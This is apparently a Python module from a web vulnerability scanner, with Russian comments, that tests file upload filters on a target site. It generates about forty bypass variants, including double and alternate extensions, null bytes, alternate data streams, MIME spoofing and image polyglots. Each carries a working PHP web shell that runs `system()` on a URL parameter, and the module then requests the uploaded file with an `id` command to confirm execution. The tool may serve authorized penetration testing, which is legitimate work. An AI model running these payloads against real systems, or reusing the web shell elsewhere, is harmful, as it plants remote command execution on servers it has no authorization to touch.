"""file_upload_bypass v2 — upload filter bypass with baseline + verify.

Техники:
  1. Extension bypass (php.jpg, php%00.jpg, php;.jpg, pHp, php::$DATA)
  2. Content-Type spoof (image/jpeg вместо text/x-php)
  3. Magic bytes + payload (GIF89a + PHP, JPEG header + PHP)
  4. Polyglot (валидный GIF/JPEG + PHP в конце)
  5. CRLF в filename

Verify: если upload успешен — попытка GET загруженного файла
  - Content-Type: text/html + наш canary в ответе → выполняется
  - Content-Type: image/* + raw payload → не выполняется, но загрузилось
"""
import secrets
import os
from core.http import HttpClient
from core.verify import confidence, is_signal


UPLOAD_PATHS = [
    "/upload", "/api/upload", "/api/v1/upload", "/api/v2/upload",
    "/file/upload", "/files/upload", "/media/upload",
    "/upload/file", "/upload/image", "/upload/avatar",
    "/avatar", "/profile/avatar", "/api/avatar", "/api/user/avatar",
    "/admin/upload", "/user/upload", "/upload.php", "/upload.aspx",
]

# canary — маркер для проверки выполнения
CANARY = "OMNI_UPLOAD_" + secrets.token_hex(4)


def _payloads():
    """Payload для разных стеков."""
    php = f"<?php echo '{CANARY}'; system($_GET['c']); ?>".encode()
    jsp = f"<% out.println(\"{CANARY}\"); %>".encode()
    asp = f"<% Response.Write(\"{CANARY}\") %>".encode()
    return {
        "php": php,
        "jsp": jsp,
        "asp": asp,
    }


# (filename, ext_stack, content_type, magic_prefix)
def _variants():
    payloads = _payloads()
    php = payloads["php"]

    variants = []
    # 1. чистый .php с разными content-type
    variants.append(("shell.php", "php", "image/jpeg", b""))
    variants.append(("shell.php", "php", "image/png", b""))
    variants.append(("shell.php", "php", "image/gif", b""))
    variants.append(("shell.php", "php", "application/octet-stream", b""))

    # 2. двойное расширение
    variants.append(("shell.php.jpg", "php", "image/jpeg", b""))
    variants.append(("shell.jpg.php", "php", "image/jpeg", b""))
    variants.append(("shell.php.png", "php", "image/png", b""))
    variants.append(("shell.php.gif", "php", "image/gif", b""))

    # 3. альтернативные расширения PHP
    for ext in ("php3", "php4", "php5", "php7", "phtml", "pht", "phar", "shtml"):
        variants.append((f"shell.{ext}", "php", "image/jpeg", b""))

    # 4. case-mix
    variants.append(("shell.PHP", "php", "image/jpeg", b""))
    variants.append(("shell.PhP", "php", "image/jpeg", b""))
    variants.append(("shell.pHp", "php", "image/jpeg", b""))

    # 5. null byte (url-encoded)
    variants.append(("shell.php%00.jpg", "php", "image/jpeg", b""))
    variants.append(("shell.php%00.png", "php", "image/png", b""))

    # 6. semicolon
    variants.append(("shell.php;.jpg", "php", "image/jpeg", b""))
    variants.append(("shell.php;.png", "php", "image/png", b""))

    # 7. windows alternate data stream
    variants.append(("shell.php::$DATA", "php", "image/jpeg", b""))

    # 8. trailing space / dot
    variants.append(("shell.php.", "php", "image/jpeg", b""))
    variants.append(("shell.php ", "php", "image/jpeg", b""))
    variants.append(("shell.php\x00.jpg", "php", "image/jpeg", b""))

    # 9. magic bytes + php (polyglot)
    gif_php = b"GIF89a" + b"\x00" * 6 + php
    variants.append(("shell.gif", "php", "image/gif", gif_php))
    variants.append(("shell.gif.php", "php", "image/gif", gif_php))
    variants.append(("shell.jpg", "php", "image/jpeg",
                     b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01" + b"\x00" * 10 + php))
    variants.append(("shell.png", "php", "image/png",
                     b"\x89PNG\r\n\x1a\n" + b"\x00" * 8 + php))

    # 10. JSP
    variants.append(("shell.jsp", "jsp", "image/jpeg", b""))
    variants.append(("shell.jspx", "jsp", "image/jpeg", b""))
    variants.append(("shell.jsp.jpg", "jsp", "image/jpeg", b""))

    # 11. ASP
    variants.append(("shell.asp", "asp", "image/jpeg", b""))
    variants.append(("shell.aspx", "asp", "image/jpeg", b""))
    variants.append(("shell.asp.jpg", "asp", "image/jpeg", b""))

    return variants


class FileUploadBypass:
    def run(self, session, logger):
        base = session.target.rstrip("/")
        http = HttpClient(session, logger)

        print(f"[upload v2] target: {base}")
        print(f"[upload v2] canary: {CANARY}")

        # === Phase 1: найти upload endpoint ===
        live = []
        for path in UPLOAD_PATHS:
            try:
                r0 = http.get(base + path, allow_redirects=False)
            except Exception:
                continue
            if r0 and r0.status_code not in (404, 410):
                live.append((path, r0.status_code))
                print(f"[upload v2] live endpoint: {path} ({r0.status_code})")

        if not live:
            print(f"[upload v2] no upload endpoint found — skip")
            return {"findings": [], "live_endpoints": []}

        payloads = _payloads()
        variants = _variants()
        findings = []

        # === Phase 2: пробуем каждый variant ===
        for path, _code in live:
            url = base + path
            print()
            print(f"[upload v2] testing {path} with {len(variants)} variants")

            for filename, stack, ctype, magic in variants:
                payload = magic + payloads[stack]
                try:
                    # multipart через HttpClient (правильно — с throttle/curl_cffi)
                    files = {"file": (filename, payload, ctype)}
                    r = http.post(url, files=files)
                except Exception:
                    continue
                if not r:
                    continue

                # --- Response analysis ---
                body = r.text or ""
                body_low = body.lower()
                status = r.status_code

                # не accepted
                if status not in (200, 201, 202, 204):
                    continue

                # ищем в ответе признаки успешной загрузки
                upload_ok = any(k in body_low for k in (
                    "uploaded", "success", "saved", "created",
                    "\"url\"", "\"path\"", "\"file\"", "\"id\"",
                ))
                # canary НЕ отражается в ответе (сервер не выполнил)
                canary_reflected = CANARY in body

                if not (upload_ok or canary_reflected):
                    continue

                # === verify ×2 — повтор той же загрузки ===
                try:
                    r2 = http.post(url, files={"file": (filename, payload, ctype)})
                except Exception:
                    r2 = None

                if not r2 or r2.status_code not in (200, 201, 202, 204):
                    continue

                # --- Опционально: попытка выполнения ---
                executed = canary_reflected  # если canary в ответе — выполнилось
                if not executed and upload_ok:
                    # попытка GET по URL из ответа
                    import re
                    urls = re.findall(r'["\'](https?://[^"\']+\.(?:php|jsp|asp|png|jpg|gif))["\']', body)
                    for file_url in urls[:3]:
                        try:
                            r3 = http.get(file_url, params={"c": "id"})
                        except Exception:
                            continue
                        if r3 and CANARY in (r3.text or ""):
                            executed = True
                            break

                # --- Классификация ---
                ftype, sev, strength = None, None, 0
                if executed:
                    ftype, sev, strength = "upload_rce", "critical", 0.95
                elif "::$DATA" in filename or "%00" in filename or "\x00" in filename:
                    ftype, sev, strength = "upload_null_byte", "high", 0.7
                elif stack != "php" and stack in filename:
                    ftype, sev, strength = f"upload_{stack}_accepted", "high", 0.7
                elif "." in filename and filename.count(".") > 1:
                    ftype, sev, strength = "upload_double_extension", "high", 0.7
                elif "image/" in ctype and stack == "php":
                    ftype, sev, strength = "upload_mime_spoof", "medium", 0.6
                elif magic:
                    ftype, sev, strength = "upload_polyglot", "medium", 0.6
                else:
                    ftype, sev, strength = "upload_php_accepted", "high", 0.65

                conf = confidence(strength, 1.0 if r2 else 0.5)
                if not is_signal(conf, floor=0.55, module="file_upload"):
                    continue

                findings.append({
                    "type": ftype,
                    "severity": sev,
                    "path": path,
                    "filename": filename,
                    "content_type": ctype,
                    "stack": stack,
                    "executed": executed,
                    "confidence": conf,
                })
                print(f"  ✓ {ftype}: {filename} ({ctype}) executed={executed}")
                logger.finding("file_upload", sev,
                               f"{path} {filename} ({ctype})")

                # если нашли executed — стоп для этого endpoint
                if executed:
                    break

        print()
        print(f"[upload v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "live_endpoints": [p for p, _ in live],
        }
